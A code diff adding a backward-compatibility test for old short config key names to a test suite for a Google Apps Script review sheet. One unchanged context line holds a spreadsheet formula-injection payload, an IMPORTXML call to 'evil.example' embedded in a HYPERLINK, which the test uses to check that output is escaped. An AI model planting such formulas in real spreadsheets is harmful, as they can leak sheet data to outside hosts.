@@ -225,6 +225,17 @@ describe("review-sheet.gs, built and run against a fake sheet", () => {
     expect(f).toBe('=HYPERLINK("C#PC-0002","x"",IMPORTXML(""https://evil.example"",""//a""),""")');
   });
 
+  test("a Config written with the old short DATA names (K, ABBR, LP, OFFSET, MAX) still works", () => {
+    const d = JSON.parse(pcRows.filter((r) => r[0] === "DATA").map((r) => r[1].slice(1)).join(""));
+    const old = { K: d.SECTIONS, ABBR: d.ABBREVIATIONS, LP: d.PAGE_LINES, OFFSET: d.PAGE_OFFSET, MAX: d.LAST_PAGE };
+    const rows = pcRows.filter((r) => r[0] !== "DATA").concat([["DATA", "|" + JSON.stringify(old)]]);
+    const a = runtime(withConfig(tabs(), pcRows));
+    const b = runtime(withConfig(tabs(), rows));
+    load(code, a.g).refreshAll();
+    load(code, b.g).refreshAll();
+    expect(JSON.stringify(b.written)).toBe(JSON.stringify(a.written));
+  });
+
   test("an edit rebuilds at once while a rebuild is quick", () => {
     const rt2 = runtime(withConfig(tabs(), pcRows));
     load(code, rt2.g).markDirty({ range: { getSheet: () => rt2.sheet("Agent") } });
